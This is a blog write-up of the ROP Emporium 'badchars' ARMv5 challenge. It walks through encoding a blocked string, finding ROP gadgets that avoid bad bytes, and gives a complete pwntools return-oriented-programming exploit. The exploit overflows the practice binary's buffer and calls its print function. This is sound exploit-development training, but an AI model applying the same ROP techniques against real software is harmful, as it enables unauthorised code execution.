---
title:  "badchars - ROP Emporium"
mathjax: true
layout: post
date:  2023-05-25 00:00:30 +0300
description: ROP ARMv5 writeup
tags:  [CTF, ropemporium, ROP]
image:  '/media/posts_thumb/badchars.png'
---





# ROP Emporium - badchars ARMv5 solution

Alrighty, this one is a little harder than the write4 challenge.  



Like before we have to call the **usefulFunction** listed bellow with the *flag.txt* string:



```
disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x000105d4 <+0>:    push    {r11, lr}
   0x000105d8 <+4>:    add    r11, sp, #4
   0x000105dc <+8>:    ldr    r0, [pc, #8]    @ 0x105ec <usefulFunction+24>
   0x000105e0 <+12>:    bl    0x104b4 <print_file@plt>
   0x000105e4 <+16>:    nop   		 @ (mov r0, r0)
   0x000105e8 <+20>:    pop    {r11, pc}
   0x000105ec <+24>:    muleq    r1, r8, r6

```



We have to follow the calling convention for ARMv5 which dictates that the first arguments are supposed to be in R0, R1, R2 and R3 respectively.



Upon further inspection, the binary spills out the bad characters which will get filtered out: 

```
badchars are: 'x', 'g', 'a', '.' --> 7867612e
```



So here we can already see the problem. 3 characters of the *flag.txt* string will be blocked, we need to encode them somehow.



## What's our task?



To solve this level we need to accomplish the following:

- [ ]  Write the encoded string into memory
- [ ]  Decode the encoded string
- [ ]  Call our **usefulFunction** with the decoded string to get our flag



There are a few different gadgets we can use to decode an encoded string:



```
disassemble usefulGadgets
  Dump of assembler code for function usefulGadgets:
  
  SUB GADGET:
   0x000105f0 <+0>:    ldr    r1, [r5]
   0x000105f4 <+4>:    sub    r1, r1, r6
   0x000105f8 <+8>:    str    r1, [r5]
   0x000105fc <+12>:    pop    {r0, pc}
   
   ADD GADGET:
   0x00010600 <+16>:    ldr    r1, [r5]
   0x00010604 <+20>:    add    r1, r1, r6
   0x00010608 <+24>:    str    r1, [r5]
   0x0001060c <+28>:    pop    {r0, pc}
   
   STORE GADGET:
   0x00010610 <+32>:    str    r3, [r4]
   0x00010614 <+36>:    pop    {r5, r6, pc}
   
   OR GADGET:
   0x00010618 <+40>:    ldr    r1, [r5]
   0x0001061c <+44>:    eor    r1, r1, r6
   0x00010620 <+48>:    str    r1, [r5]
   0x00010624 <+52>:    pop    {r0, pc}

```



With the help of these gadgets we can decode a string using subtraction, addition or logical OR.

I'll shift the *flag.txt* by one so I'll be using the **ADD GADGET**



## Encoded string: flag.txt - 1 = ek`f-sws



Now when the binary asks for input, we can successfully get this encoded string to memory without getting any of the characters filtered out.

 After that all that's left is to use the **ADD GADGET** to decoded it back and call our **usefulFunction** to print the contents of the flag.



## Controlling the PC register



To find out how many bytes we need in order to control the flow of execution we can use the following snipet:



```python
def find_pc_offset(payload, alpha):
   io = start()
   io.sendlineafter("> ", payload)
   io.wait() # wait for crash
   core = io.corefile
   pc_value = core.pc
   pc_offset = cyclic_find(pc_value, alphabet=alpha)


   info("Found PC offset at: %#x", pc_offset)
   return pc_offset


# badchars are: 'x', 'g', 'a', '.'
# python -c 'from pwn import *; print(enhex(b"xga."))' = 7867612e
alpha = 'bcde'
payload = cyclic(100, alphabet=alpha)
pc_offset = find_pc_offset(payload, alpha)

```



So after 44 (0x2c) bytes we can redirect the execution to our gadgets



## Building the gadget



First things first, we need to store our encoded string *somewhere* using the **STORE GADGET** listed bellow:

```assembly
 STORE GADGET:
   0x00010610 <+32>:    str    r3, [r4]
   0x00010614 <+36>:    pop    {r5, r6, pc}
```



The string *flag.txt* or rather *ek`f-sws* is 8 bytes long, where can we store this inside the target binary?



We can check out the ELF sections for the target:



```
readelf -S badchars_armv5
There are 29 section headers, starting at offset 0x1bb4:

Заголовки разделов:
  [Нм] Имя           	Тип         	Адрес	Смещ   Разм   ES Флг Сс Инф Al
  [ 0]               	NULL        	00000000 000000 000000 00  	0   0  0
  [ 1] .interp       	PROGBITS    	00010154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag 	NOTE        	00010168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.bu[...] NOTE        	00010188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash     	GNU_HASH    	000101ac 0001ac 000060 04   A  5   0  4
  [ 5] .dynsym       	DYNSYM      	0001020c 00020c 000110 10   A  6   1  4
  [ 6] .dynstr       	STRTAB      	0001031c 00031c 0000e0 00   A  0   0  1
  [ 7] .gnu.version  	VERSYM      	000103fc 0003fc 000022 02   A  5   0  2
  [ 8] .gnu.version_r	VERNEED     	00010420 000420 000020 00   A  6   1  4
  [ 9] .rel.dyn      	REL         	00010440 000440 000008 08   A  5   0  4
  [10] .rel.plt      	REL         	00010448 000448 000028 08  AI  5  21  4
  [11] .init         	PROGBITS    	00010470 000470 00000c 00  AX  0   0  4
  [12] .plt          	PROGBITS    	0001047c 00047c 000050 04  AX  0   0  4
  [13] .text         	PROGBITS    	000104cc 0004cc 0001c0 00  AX  0   0  4
  [14] .fini         	PROGBITS    	0001068c 00068c 000008 00  AX  0   0  4
  [15] .rodata       	PROGBITS    	00010694 000694 000010 00   A  0   0  4
  [16] .ARM.exidx    	ARM_EXIDX   	000106a4 0006a4 000008 00  AL 13   0  4
  [17] .eh_frame     	PROGBITS    	000106ac 0006ac 000004 00   A  0   0  4
  [18] .init_array   	INIT_ARRAY  	00020f00 000f00 000004 04  WA  0   0  4
  [19] .fini_array   	FINI_ARRAY  	00020f04 000f04 000004 04  WA  0   0  4
  [20] .dynamic      	DYNAMIC     	00020f08 000f08 0000f8 08  WA  6   0  4
  [21] .got          	PROGBITS    	00021000 001000 000024 04  WA  0   0  4
  [22] .data         	PROGBITS    	00021024 001024 000008 00  WA  0   0  4
  [23] .bss          	NOBITS      	0002102c 00102c 000004 00  WA  0   0  1
  [24] .comment      	PROGBITS    	00000000 00102c 000030 01  MS  0   0  1
  [25] .ARM.attributes   ARM_ATTRIBUTES  00000000 00105c 000028 00  	0   0  1
  [26] .symtab       	SYMTAB      	00000000 001084 0006d0 10 	27  84  4
  [27] .strtab       	STRTAB      	00000000 001754 000358 00  	0   0  1
  [28] .shstrtab     	STRTAB      	00000000 001aac 000105 00  	0   0  1
```



The data section at [22] has exactly the 8 bytes we need!



What needs to be done now is to get the address of the data section into **R4** and the encoded string into **R3** for the **STORE GAGDET**



Let's use ropper to see if we can find gadgets to POP into these registers.



```
ropper --file=badchars_armv5 --search "pop"

[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop


[INFO] File: badchars_armv5
0x000105d0: pop {fp, pc};
0x000105fc: pop {r0, pc};
0x00010478: pop {r3, pc};
0x000105b0: pop {r4, pc};
0x0001067c: pop {r4, r5, r6, r7, r8, sb, sl, pc};
0x0001067c: pop {r4, r5, r6, r7, r8, sb, sl, pc}; andeq r0, r1, r8, asr #17; andeq r0, r1, r0, asr #17; bx lr;
0x00010614: pop {r5, r6, pc};
0x000105a0: popne {r4, pc}; bl #0x52c; mov r3, #1; strb r3, [r4]; pop {r4, pc};

```



Notice anything strange? The **pop {r3, pc};** gadget is at **0x00010478** but this address contains **0x78** which is one of our bad characters (**7867612e**), therefore we cannot use this gadget. 



Luckily as stated in the challenge page, ropper has a bad characters option to help us here:



```
ropper --file=badchars_armv5 --search "pop" -b 7867612e
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] filtering badbytes... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop


[INFO] File: badchars_armv5
0x000105d0: pop {fp, pc};
0x000105fc: pop {r0, pc};
0x00010690: pop {r3, pc};
0x000105b0: pop {r4, pc};
0x0001067c: pop {r4, r5, r6, r7, r8, sb, sl, pc};
0x0001067c: pop {r4, r5, r6, r7, r8, sb, sl, pc}; andeq r0, r1, r8, asr #17; andeq r0, r1, r0, asr #17; bx lr;
0x00010614: pop {r5, r6, pc};
0x000105a0: popne {r4, pc}; bl #0x52c; mov r3, #1; strb r3, [r4]; pop {r4, pc};

```



There we go!  **0x00010690: pop {r3, pc};** is a much better gadget and won't cause us any problems

Remember that we're dealing with 4 byte registers so to store our 8 byte-encoded flag we need to call the storage gadget twice:



```python
encoded_flag = b'ek`f-sws'

# write first 4 bytes of encoded flag
payload = b"A" * pc_offset
payload += pop_r3_gadget
payload += encoded_flag[:4]
payload += pop_r4_gadget
payload += p32(datasection_addr)
payload += storage_gadget
payload += p32(datasection_addr)# r5
payload += p32(0x1) # r6

# write remaining 4 bytes of the encoded flag
payload += pop_r3_gadget
payload += encoded_flag[4:]
payload += pop_r4_gadget
payload += p32(datasection_addr + 4)
payload += storage_gadget
payload += p32(datasection_addr)# r5
payload += p32(0x1) # r6
```



 The **STORE GADGET** also pops into **R5** and **R6** which will be used by the **ADD GADGET**. Thus, when storing the flag in data section we already pop the right values (**datasection_addr** and **0x1** since our encoded flag was shifted by one as described earlier).



Ok, so we're done with first step. Now we need to decode this string back to its original form before calling our function

- [x] Write the encoded string into memory
- [ ] Decode the encoded string
- [ ] Call our **usefulFunction** with the decoded string to get our flag



## The ADD Gadget



Now that our encoded string is inside the data section we can use the **ADD GADGET** to decode it:

```assembly

   0x00010600 <+16>:    ldr    r1, [r5]
   0x00010604 <+20>:    add    r1, r1, r6
   0x00010608 <+24>:    str    r1, [r5]
   0x0001060c <+28>:    pop    {r0, pc}
```



For this gadget to work we need to store the data section address into **R5** and 0x1 into **R6**, that way it'll shift the string **ek`f-sws** back to **flag.txt**.

This has been done already in the previous step when setting up the **STORE GADGET**. However this gadget will only decode one byte at a time, so we can use the following snipet to decoded the whole string:



```python
add_xploit = b""
for i in range(len(encoded_flag)):
   add_xploit += pop_r5_r6_gadget
   add_xploit += p32(datasection_addr + i)
   add_xploit += p32(0x1) # shift back
   add_xploit += add_gadget
   add_xploit += p32(datasection_addr)
```



Nice, now we just need to call **usefulFunction** to get our flag.



- [x] Write the encoded string into memory
- [x] Decode the encoded string
- [ ] Call our **usefulFunction** with the decoded string to get our flag



This should be easy enough, just adding its address to the payload will do:



```python
payload += call_print
```



- [x] Write the encoded string into memory
- [x] Decode the encoded string
- [x] Call our **usefulFunction** with the decoded string to get our flag



## Exploit

Here's the full exploit:



```python
from pwn import *

context.binary = elf = ELF('badchars_armv5')
context.log_level = 'info'


gs = '''
continue
'''

def start():
   if args.GDB:
       return gdb.debug(elf.path, gdbscript=gs)
   else:
       return process(elf.path)
  
def find_pc_offset(payload, alpha):
   io = start()
   io.sendlineafter("> ", payload)
   io.wait() # wait for crash
   core = io.corefile
   pc_value = core.pc
   pc_offset = cyclic_find(pc_value, alphabet=alpha)


   info("Found PC offset at: %#x", pc_offset)
   return pc_offset

# badchars are: 'x', 'g', 'a', '.'
# python -c 'from pwn import *; print(enhex(b"xga."))' = 7867612e
alpha = 'bcde'
payload = cyclic(100, alphabet=alpha)
pc_offset = find_pc_offset(payload, alpha)


io = start()

datasection_addr = elf.symbols['__data_start']
call_print = p32(0x000105e0)
storage_gadget = p32(0x00010610)
add_gadget = p32(0x00010600)

# gadgets
pop_r0_gadget = p32(0x000105fc) #: pop {r0, pc};
pop_r3_gadget = p32(0x00010690) # : pop {r4, pc};
pop_r4_gadget = p32(0x000105b0) #: pop {r4, pc};
pop_r5_r6_gadget = p32(0x00010614) #: pop {r5, r6, pc};

info('%#x - data section', datasection_addr)

# goal: write encoded string to data section
#flag.txt - 1 -> ek`f-sws

encoded_flag = b'ek`f-sws'

# decoded our encoded string
add_xploit = b""
for i in range(len(encoded_flag)):
   add_xploit += pop_r5_r6_gadget
   add_xploit += p32(datasection_addr + i)
   add_xploit += p32(0x1)
   add_xploit += add_gadget
   add_xploit += p32(datasection_addr)

# write first 4 bytes of encoded flag
payload = b"A" * pc_offset
payload += pop_r3_gadget
payload += encoded_flag[:4]
payload += pop_r4_gadget
payload += p32(datasection_addr)
payload += storage_gadget
payload += p32(datasection_addr)# r5
payload += p32(0x1) # r6

# write remaining 4 bytes of the encoded flag
payload += pop_r3_gadget
payload += encoded_flag[4:]
payload += pop_r4_gadget
payload += p32(datasection_addr + 4)
payload += storage_gadget
payload += p32(datasection_addr)# r5
payload += p32(0x1) # r6

# decode and pwn
payload += add_xploit
payload += call_print

io.sendlineafter("> ", payload)
io.recvuntil("Thank you!\n")
flag = io.recv()

success(flag)
```



Execute it and *voilà*, we got our flag!



```
[+] ROPE{a_placeholder_32byte_flag!}
```

